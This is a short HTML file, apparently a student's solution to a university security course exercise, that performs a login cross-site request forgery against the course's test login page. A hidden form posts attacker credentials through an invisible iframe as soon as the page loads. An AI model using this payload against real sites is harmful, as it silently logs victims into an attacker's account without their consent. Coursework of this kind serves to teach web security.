@@ -1,0 +1,28 @@
+<!DOCTYPE HTML>
+<!--  Project 2 2.0 No defenses -->
+<!--  Given by the project specification that 
+      Login handler accepts POST requests and takes plaintext
+      "username" and "password" query parameters. It checks if
+      a user with those credentials exists. 
+-->
+<head>
+  <meta charset="UTF-8">
+  <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+<body>
+  <!-- reference:http://www.coderanch.com/t/419926/HTML-CSS-JavaScript/hidden-iframe -->
+  <iframe id="hidden_iframe" name="hidden_iframe"></iframe>
+
+  <form id="form" name="form" action="http://eecs388.org/project2/login" method="POST" target="hidden_iframe">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="l33th4x">
+    <input type="hidden" name="csrfdefense" value="0">
+    <input type="hidden" name="xssdefense" value="4">
+  </form>
+<script>
+  document.getElementById("hidden_iframe").style.display="none";
+  document.getElementById("hidden_iframe").style.visibility="hidden";
+  document.form.submit();
+</script>
+</body>
